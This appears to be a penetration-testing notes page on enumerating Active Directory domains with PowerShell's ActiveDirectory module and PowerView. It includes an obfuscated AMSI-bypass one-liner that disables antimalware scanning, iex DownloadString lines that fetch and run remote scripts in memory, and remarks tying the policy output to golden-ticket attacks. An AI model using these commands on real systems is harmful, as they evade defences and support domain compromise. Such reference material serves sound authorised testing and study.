---
title: "Domains"
description: "Enumerating domains."
lead: "Enumerating information about domains using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T17:46:09+01:00
lastmod: 2021-11-07T17:46:09+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 5
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get current domain
Get-ADDomain

# Get object of another domain
Get-ADDomain -Identity lab.local

# Get domain SID for current domain
(Get-ADDomain).DomainSID

# Get domain controllers for current domain
Get-ADDomainController

# Get domain controllers for another domain
Get-ADDomainController -DomainName lab.local -Discover
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Get current domain
Get-NetDomain

# Get object of another domain
Get-NetDomain -Domain lab.local

# Get domain SID for current domain
Get-DomainSID

# Get domain policy for current domain
Get-DomainPolicy
(Get-DomainPolicy)."System Access"

# Get domain policy for another domain
# Password policy
(Get-DomainPolicy -Domain lab.local)."System Access"

# Kerberos policy for e.g. mimikatz golden tickets
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"

# Get domain controllers for current domain
Get-NetDomainController

# Get domain controllers for another domain
Get-NetDomainController -Domain lab.local

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog

# Turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}

# Enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# Enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Domain bufu-sec.local
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.
```
